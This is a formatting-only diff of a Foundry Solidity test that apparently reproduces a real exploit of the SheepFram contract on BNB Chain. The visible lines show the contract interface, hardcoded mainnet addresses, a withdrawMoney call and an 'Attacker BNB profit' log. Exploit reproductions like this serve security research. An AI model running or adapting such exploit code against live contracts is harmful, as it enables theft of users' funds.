@@ -10,14 +10,17 @@ import "forge-std/Test.sol";
 // https://bscscan.com/tx/0x5735026e5de6d1968ab5baef0cc436cc0a3f4de4ab735335c5b1bd31fa60c582
 
 interface SheepFram {
+
     function register(address neighbor) external;
     function addGems() external payable;
     function upgradeVillage(uint256 framId) external;
     function withdrawMoney(uint256 wool) external;
     function sellVillage() external;
+
 }
 
 contract ContractTest is Test {
+
     SheepFram sheepFram = SheepFram(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
     address neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;
 
@@ -38,12 +41,9 @@ contract ContractTest is Test {
         sheepFram.withdrawMoney(20_000);
         uint256 BalanceAfter = address(this).balance;
 
-        emit log_named_decimal_uint(
-            "Attacker BNB profit after exploit",
-            (BalanceAfter - BalanceBefore),
-            18
-        );
+        emit log_named_decimal_uint("Attacker BNB profit after exploit", (BalanceAfter - BalanceBefore), 18);
     }
 
     receive() external payable {}
+
 }
